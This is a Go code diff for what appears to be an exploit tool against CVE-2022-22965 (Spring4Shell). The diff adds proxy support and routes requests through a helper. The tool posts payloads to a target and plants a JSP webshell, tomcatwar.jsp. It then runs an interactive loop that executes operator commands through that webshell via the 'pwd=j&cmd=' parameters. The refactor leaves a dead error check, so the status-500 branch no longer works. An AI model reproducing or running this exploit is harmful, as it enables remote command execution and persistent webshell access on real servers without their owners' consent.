@@ -2,11 +2,9 @@ package exppackage
 
 import (
 	"bufio"
-	"bytes"
 	"fmt"
 	"github.com/dlclark/regexp2"
 	"github.com/fatih/color"
-	"io/ioutil"
 	"net/http"
 	"os"
 	"ssp/common"
@@ -14,7 +12,7 @@ import (
 	"time"
 )
 
-func CVE_2022_22965(url string) {
+func CVE_2022_22965(url string, proxyURL string) {
 	Headers_1 := map[string]string{
 		"User-Agent":   common.GetRandomUserAgent(),
 		"suffix":       "%>//",
@@ -32,36 +30,28 @@ func CVE_2022_22965(url string) {
 	data2 := payload_win
 	getpayload := url + payload_http
 
-	client := &http.Client{}
+	// 使用 MakeRequest 来发送 POST 请求
 	for _, payload := range []string{data1, data2} {
-		req, err := http.NewRequest("POST", url, bytes.NewBufferString(payload))
+		_, _, err := common.MakeRequest(url, "POST", proxyURL, Headers_1, payload)
 		if err != nil {
-			fmt.Println("Error creating request:", err)
-			return
-		}
-		for key, value := range Headers_1 {
-			req.Header.Set(key, value)
-		}
-		_, err = client.Do(req)
-		if err != nil {
-			fmt.Println("Error executing request:", err)
+			fmt.Println("Error executing POST request:", err)
 			return
 		}
 		time.Sleep(500 * time.Millisecond)
 	}
 
-	_, err := http.Get(getpayload)
+	// 使用 MakeRequest 来发送 GET 请求
+	_, _, err := common.MakeRequest(getpayload, "GET", proxyURL, nil, "")
 	if err != nil {
 		fmt.Println("Error getting payload:", err)
 		return
 	}
 	time.Sleep(500 * time.Millisecond)
 
+	// 检查 tomcatwar.jsp 是否存在
 	resp, err := http.Get(url + "tomcatwar.jsp")
-	resp, err = http.Get(url + "tomcatwar.jsp")
-
 	if err != nil {
-		fmt.Println("Error checking status code:", err)
+		fmt.Println("Error checking tomcatwar.jsp:", err)
 		return
 	}
 
@@ -80,27 +70,16 @@ func CVE_2022_22965(url string) {
 				os.Exit(0)
 			}
 			urlShell := fmt.Sprintf("%stomcatwar.jsp?pwd=j&cmd=%s", url, Cmd)
-			req, err := http.NewRequest("GET", urlShell, nil)
-			if err != nil {
-				fmt.Println("Error creating request:", err)
-				return
-			}
-			resp, err = client.Do(req)
+			_, body, err := common.MakeRequest(urlShell, "GET", proxyURL, nil, "")
 			if err != nil {
 				color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
 				return
 			}
-			defer resp.Body.Close()
-			if resp != nil && resp.StatusCode == 500 {
+
+			if err != nil {
 				color.Yellow("[-] 重发包返回状态码500，请手动尝试利用WebShell：tomcatwar.jsp?pwd=j&cmd=whoami")
 				break
-			} else if resp != nil {
-				defer resp.Body.Close()
-				body, err := ioutil.ReadAll(resp.Body)
-				if err != nil {
-					fmt.Println("Error reading response:", err)
-					return
-				}
+			} else {
 				re, err := regexp2.Compile(`[^/]+(?=//)`, 0)
 				if err != nil {
 					fmt.Println("Error compiling regexp:", err)
@@ -113,6 +92,6 @@ func CVE_2022_22965(url string) {
 			}
 		}
 	} else {
-		color.Yellow("[-] %s 未发现CVE-2022-22965远程命令执行漏洞\n", url)
+		color.Yellow("[-] %s 未发现CVE-2022-22965远程命令执行漏洞或者已经被利用,shell地址请手动尝试访问/tomcatwar.jsp?pwd=j&cmd=命令\n", url)
 	}
 }
